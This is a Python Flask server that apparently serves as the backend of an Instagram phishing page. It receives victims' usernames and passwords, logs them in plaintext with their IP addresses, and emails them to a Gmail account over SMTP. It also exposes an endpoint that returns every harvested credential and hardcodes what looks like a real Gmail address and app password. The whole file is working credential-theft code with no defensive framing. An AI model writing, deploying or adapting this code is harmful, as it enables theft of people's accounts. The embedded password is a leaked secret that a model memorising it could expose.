from flask import Flask, request, jsonify
from flask_cors import CORS
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
from datetime import datetime
import json

app = Flask(__name__)
CORS(app, origins=["*"])

# Configuration
GMAIL_USER = os.getenv('GMAIL_USER', 'waemsa19@gmail.com')
GMAIL_PASS = os.getenv('GMAIL_PASS', 'mcci julh ypdy ngee')
LOG_FILE = 'login_attempts.json'

def save_login_attempt(username, password):
    """Save login attempt to local file"""
    try:
        # Load existing data
        data = []
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r') as f:
                data = json.load(f)
        
        # Add new login attempt
        login_data = {
            'username': username,
            'password': password,
            'timestamp': datetime.now().isoformat(),
            'ip': request.remote_addr
        }
        data.append(login_data)
        
        # Save back to file
        with open(LOG_FILE, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"Login attempt saved: {username}")
        return True
    except Exception as e:
        print(f"Error saving login attempt: {e}")
        return False

def send_email(username, password):
    """Send email with login credentials"""
    try:
        msg = MIMEMultipart()
        msg['From'] = GMAIL_USER
        msg['To'] = GMAIL_USER
        msg['Subject'] = 'New Instagram Login Attempt'
        
        body = f"""
        New Login Attempt:
        Username: {username}
        Password: {password}
        IP Address: {request.remote_addr}
        Timestamp: {datetime.now().isoformat()}
        """
        
        msg.attach(MIMEText(body, 'plain'))
        
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(GMAIL_USER, GMAIL_PASS)
        text = msg.as_string()
        server.sendmail(GMAIL_USER, GMAIL_USER, text)
        server.quit()
        
        print(f"Email sent for login attempt: {username}")
        return True
    except Exception as e:
        print(f"Error sending email: {e}")
        return False

@app.route('/api/login', methods=['POST'])
def login():
    """Handle login requests"""
    try:
        data = request.get_json()
        username = data.get('username', '')
        password = data.get('password', '')
        
        if not username or not password:
            return jsonify({'message': 'Username and password are required'}), 400
        
        # Save login attempt locally
        save_login_attempt(username, password)
        
        # Send email if credentials are configured
        if GMAIL_USER != 'waemsa19@gmail.com' and GMAIL_PASS != 'mcci julh ypdy ngee':
            send_email(username, password)
        
        return jsonify({'message': 'Login received and saved!'})
    
    except Exception as e:
        print(f"Error processing login: {e}")
        return jsonify({'message': 'Error processing login request'}), 500

@app.route('/api/logs', methods=['GET'])
def get_logs():
    """Get all saved login attempts (for monitoring)"""
    try:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r') as f:
                data = json.load(f)
            return jsonify(data)
        else:
            return jsonify([])
    except Exception as e:
        print(f"Error reading logs: {e}")
        return jsonify({'error': 'Error reading logs'}), 500

@app.route('/api/clear-logs', methods=['POST'])
def clear_logs():
    """Clear all saved login attempts"""
    try:
        if os.path.exists(LOG_FILE):
            os.remove(LOG_FILE)
        return jsonify({'message': 'Logs cleared successfully'})
    except Exception as e:
        print(f"Error clearing logs: {e}")
        return jsonify({'error': 'Error clearing logs'}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("Starting Instagram Login Server...")
    print(f"Gmail User: {GMAIL_USER}")
    print(f"Log file: {LOG_FILE}")
    print(f"Server running on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False) 